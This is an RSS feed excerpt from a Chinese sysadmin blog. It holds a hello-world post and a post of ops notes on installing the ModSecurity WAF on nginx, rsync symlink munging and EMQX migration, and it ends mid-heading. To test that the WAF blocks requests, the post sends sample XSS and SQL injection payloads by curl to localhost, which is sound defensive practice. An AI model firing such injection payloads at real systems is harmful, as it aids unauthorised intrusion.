<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>一个曾经的小码农...</title><link>https://blog.0x5c0f.cc/</link><description>一个曾经的小码农...</description><generator>Hugo 0.152.1 &amp; FixIt v0.4.0-alpha.3</generator><language>zh-CN</language><managingEditor>mail@0x5c0f.cc (0x5c0f)</managingEditor><webMaster>mail@0x5c0f.cc (0x5c0f)</webMaster><lastBuildDate>Mon, 29 Dec 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.0x5c0f.cc/index.xml" rel="self" type="application/rss+xml"/><item><title>Starting</title><link>https://blog.0x5c0f.cc/posts/starting/</link><pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/starting/</guid><category domain="https://blog.0x5c0f.cc/categories/other/">Other</category><description>&lt;blockquote&gt;
&lt;p&gt;第一篇文章当然是&lt;code&gt;hello world&lt;/code&gt;了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt; echo &amp;#34;hello world !&amp;#34;&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>那些杂七杂八的记录(三)</title><link>https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.3/</link><pubDate>Tue, 17 Jun 2025 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.3/</guid><category domain="https://blog.0x5c0f.cc/categories/linux/">Linux</category><category domain="https://blog.0x5c0f.cc/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</category><description>&lt;h2 class="heading-element" id="nginx-安装-modsecurity-waf-以增强网站安全"&gt;&lt;span&gt;Nginx 安装 ModSecurity WAF 以增强网站安全&lt;/span&gt;
 &lt;a href="#nginx-%e5%ae%89%e8%a3%85-modsecurity-waf-%e4%bb%a5%e5%a2%9e%e5%bc%ba%e7%bd%91%e7%ab%99%e5%ae%89%e5%85%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;details&gt;
&lt;summary&gt; Nginx 安装 ModSecurity WAF 以增强网站安全 &lt;/summary&gt;
&lt;h3 class="heading-element" id="modsecurity-waf-连接器扩展依赖"&gt;&lt;span&gt;ModSecurity WAF 连接器扩展依赖&lt;/span&gt;
 &lt;a href="#modsecurity-waf-%e8%bf%9e%e6%8e%a5%e5%99%a8%e6%89%a9%e5%b1%95%e4%be%9d%e8%b5%96" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; yum install -y libmodsecurity-devel&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="下载-modsecurity-waf-连接器"&gt;&lt;span&gt;下载 ModSecurity WAF 连接器&lt;/span&gt;
 &lt;a href="#%e4%b8%8b%e8%bd%bd-modsecurity-waf-%e8%bf%9e%e6%8e%a5%e5%99%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; git clone https://github.com/owasp-modsecurity/ModSecurity-nginx.git&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="编译安装"&gt;&lt;span&gt;编译安装&lt;/span&gt;
 &lt;a href="#%e7%bc%96%e8%af%91%e5%ae%89%e8%a3%85" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; cd /data/softsrc/openresty-1.21.4.1
$&amp;gt; ./configure --prefix=/opt/nginxss --add-module=/pathto/ModSecurity-nginx &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="创建配置文件目录"&gt;&lt;span&gt;创建配置文件目录&lt;/span&gt;
 &lt;a href="#%e5%88%9b%e5%bb%ba%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e7%9b%ae%e5%bd%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; mkdir /opt/nginxssl/conf/modsec&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="核心规则配置"&gt;&lt;span&gt;核心规则配置&lt;/span&gt;
 &lt;a href="#%e6%a0%b8%e5%bf%83%e8%a7%84%e5%88%99%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; cd /opt/nginxssl/conf/modsec &amp;amp;&amp;amp; git clone https://github.com/coreruleset/coreruleset.git
$&amp;gt; cd /opt/nginxssl/conf/modsec/coreruleset &amp;amp;&amp;amp; cp -v crs-setup.conf.example crs-setup.conf&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="下载-modsecurity-配置相关文件"&gt;&lt;span&gt;下载 ModSecurity 配置相关文件&lt;/span&gt;
 &lt;a href="#%e4%b8%8b%e8%bd%bd-modsecurity-%e9%85%8d%e7%bd%ae%e7%9b%b8%e5%85%b3%e6%96%87%e4%bb%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; wget -O /opt/nginxssl/conf/modsec/modsecurity.conf https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended
$&amp;gt; wget -O /opt/nginxssl/conf/modsec/unicode.mapping https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/unicode.mapping&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="创建入口文件"&gt;&lt;span&gt;创建入口文件&lt;/span&gt;
 &lt;a href="#%e5%88%9b%e5%bb%ba%e5%85%a5%e5%8f%a3%e6%96%87%e4%bb%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; vim /opt/nginxssl/conf/modsec/main.conf
Include /opt/nginxssl/conf/conf/modsec/modsecurity.conf
Include /opt/nginxssl/conf/modsec/coreruleset/crs-setup.conf
Include /opt/nginxssl/conf/modsec/coreruleset/rules/*.conf&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="修改配置文件-modsecurityconf"&gt;&lt;span&gt;修改配置文件 modsecurity.conf&lt;/span&gt;
 &lt;a href="#%e4%bf%ae%e6%94%b9%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6-modsecurityconf" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; vim /opt/nginxssl/conf/modsec/modsecurity.conf
## DetectionOnly 只记录，不拦截 
## On 拦截并记录
## Off 完全关闭
# SecRuleEngine DetectionOnly
SecRuleEngine On

# 以下为关键配置， 核心关注SecAuditLog 、 SecAuditLogFormat 配置
SecAuditEngine RelevantOnly
SecAuditLog /var/log/modsec_audit.log 
SecAuditLogParts ABIJDEFHZ
SecAuditLogType Serial
SecAuditLogFormat JSON # 设置为 JSON 格式，方便查看&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="修改-nginx-配置文件启用-modsecurity-waf"&gt;&lt;span&gt;修改 nginx 配置文件启用 ModSecurity WAF&lt;/span&gt;
 &lt;a href="#%e4%bf%ae%e6%94%b9-nginx-%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e5%90%af%e7%94%a8-modsecurity-waf" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; vim /opt/nginxssl/conf/nginx.conf
# http or server or location
modsecurity on;
modsecurity_rules_file /opt/nginxssl/conf/modsec/main.conf;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="拦截测试"&gt;&lt;span&gt;拦截测试&lt;/span&gt;
 &lt;a href="#%e6%8b%a6%e6%88%aa%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; curl &amp;#34;http://127.0.0.1/?param=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34;
# sql 注入
$&amp;gt; curl &amp;#34;http://127.0.0.1/?param=1&amp;#39; AND 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users WHERE &amp;#39;1&amp;#39;=&amp;#39;1&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="白名单添加方案"&gt;&lt;span&gt;白名单添加方案&lt;/span&gt;
 &lt;a href="#%e7%99%bd%e5%90%8d%e5%8d%95%e6%b7%bb%e5%8a%a0%e6%96%b9%e6%a1%88" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; vim /opt/nginxssl/conf/modsec/modsecurity.conf
# SecRuleEngine 之后配置， 其中id 字段唯一
# 跳过 192.168.1.100 的全部 ModSecurity 检查
SecRule REMOTE_ADDR &amp;#34;@ipMatch 192.168.1.100&amp;#34; &amp;#34;id:10000,phase:1,pass,nolog,ctl:ruleEngine=Off&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="其他白名单方案未测试"&gt;&lt;span&gt;其他白名单方案(未测试)&lt;/span&gt;
 &lt;a href="#%e5%85%b6%e4%bb%96%e7%99%bd%e5%90%8d%e5%8d%95%e6%96%b9%e6%a1%88%e6%9c%aa%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 限制某路径仅特定 IP 可访问
SecRule REQUEST_URI &amp;#34;^/admin&amp;#34; &amp;#34;phase:1,deny,id:20001,msg:&amp;#39;Forbidden access to /admin&amp;#39;,chain&amp;#34;
 SecRule REMOTE_ADDR &amp;#34;!@ipMatch 192.168.1.100&amp;#34;

# 禁止某路径使用 GET 请求
SecRule REQUEST_URI &amp;#34;^/secure-action&amp;#34; &amp;#34;phase:1,deny,id:20002,msg:&amp;#39;GET not allowed here&amp;#39;,chain&amp;#34;
 SecRule REQUEST_METHOD &amp;#34;@streq GET&amp;#34;

# 仅允许特定 Referer 或 User-Agent 访问某路径
SecRule REQUEST_URI &amp;#34;^/api/private&amp;#34; &amp;#34;phase:1,deny,id:20003,msg:&amp;#39;Blocked non-authorized client&amp;#39;,chain&amp;#34;
 SecRule REQUEST_HEADERS:User-Agent &amp;#34;!@streq MyTrustedClient/1.0&amp;#34;

# 还可以在不同的location下单独设置启用不同规则，用以实现多元化&lt;/code&gt;&lt;/pre&gt;&lt;/details&gt;
&lt;h2 class="heading-element" id="rsync-同步的软链接出现同步结果指向目标会多一个-rsyncd-munged"&gt;&lt;span&gt;Rsync 同步的软链接出现，同步结果指向目标会多一个 /rsyncd-munged/&lt;/span&gt;
 &lt;a href="#rsync-%e5%90%8c%e6%ad%a5%e7%9a%84%e8%bd%af%e9%93%be%e6%8e%a5%e5%87%ba%e7%8e%b0%e5%90%8c%e6%ad%a5%e7%bb%93%e6%9e%9c%e6%8c%87%e5%90%91%e7%9b%ae%e6%a0%87%e4%bc%9a%e5%a4%9a%e4%b8%80%e4%b8%aa-rsyncd-munged" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# /rsyncd-munged/ 是为了防止客户端通过上传的链接跳出模块目录（安全保护）
# rsyncd.conf 添加配置，重启服务
use chroot = yes # 建议开启此项，如果同时关闭 munge ，可能造成额外的安全隐患 
munge symlinks = no&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="emqx-迁移"&gt;&lt;span&gt;emqx 迁移&lt;/span&gt;
 &lt;a href="#emqx-%e8%bf%81%e7%a7%bb" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;emqx&lt;/code&gt;迁移只需要备份 &lt;code&gt;etc&lt;/code&gt; 和 &lt;code&gt;data&lt;/code&gt; 目录，保持迁移前后版本一致, 然后在新节点加载这两个目录即可。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 当前迁移示例为win到linux
# windows 备份
# 先停掉服务 ， 然后直接打包 etc 和 data 目录 
$&amp;gt; emqx stop

# linux 恢复
## 创建目录 
$&amp;gt; mkdir -p data/{etc,data,log}

# 解压备份文件 data 到 data ， etc 到 etc

# 调整权限
$&amp;gt; chown -R 1000:1000 data

# 容器方式运行， 创建compose文件 (注意: 物理环境部署迁移到容器环境，可能导致 node 信息不一致，导致迁移失败，如果是此情况，建议重新部署)
$&amp;gt; vim docker-compose.yml
services:
 emqx:
 image: emqx/emqx:5.3.2
 container_name: emqx
 restart: always
 environment:
 - EMQX_NODE_NAME=emqx@localhost
 ports:
 - &amp;#34;1883:1883&amp;#34; # MQTT
 - &amp;#34;8883:8883&amp;#34; # MQTT over TLS
 - &amp;#34;8083:8083&amp;#34; # MQTT over WebSocket
 - &amp;#34;8084:8084&amp;#34; # MQTT over WSS
 - &amp;#34;18083:18083&amp;#34; # Dashboard
 volumes:
 - ./data/etc:/opt/emqx/etc
 - ./data/data:/opt/emqx/data
 - ./data/log:/opt/emqx/log

# 启动服务
$&amp;gt; docker-compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="fedora-系统界面默认字体是-adwaita-sansubuntu-默认是-ubuntu-sans-看起来还是有些差异的-感觉还是-adwaita-sans-好看一些"&gt;&lt;span&gt;Fedora 系统界面默认字体是 Adwaita sans，Ubuntu 默认是 Ubuntu sans， 看起来还是有些差异的， 感觉还是 Adwaita sans 好看一些&lt;/span&gt;
 &lt;a href="#fedora-%e7%b3%bb%e7%bb%9f%e7%95%8c%e9%9d%a2%e9%bb%98%e8%ae%a4%e5%ad%97%e4%bd%93%e6%98%af-adwaita-sansubuntu-%e9%bb%98%e8%ae%a4%e6%98%af-ubuntu-sans-%e7%9c%8b%e8%b5%b7%e6%9d%a5%e8%bf%98%e6%98%af%e6%9c%89%e4%ba%9b%e5%b7%ae%e5%bc%82%e7%9a%84-%e6%84%9f%e8%a7%89%e8%bf%98%e6%98%af-adwaita-sans-%e5%a5%bd%e7%9c%8b%e4%b8%80%e4%ba%9b" class="heading-mark"&gt;
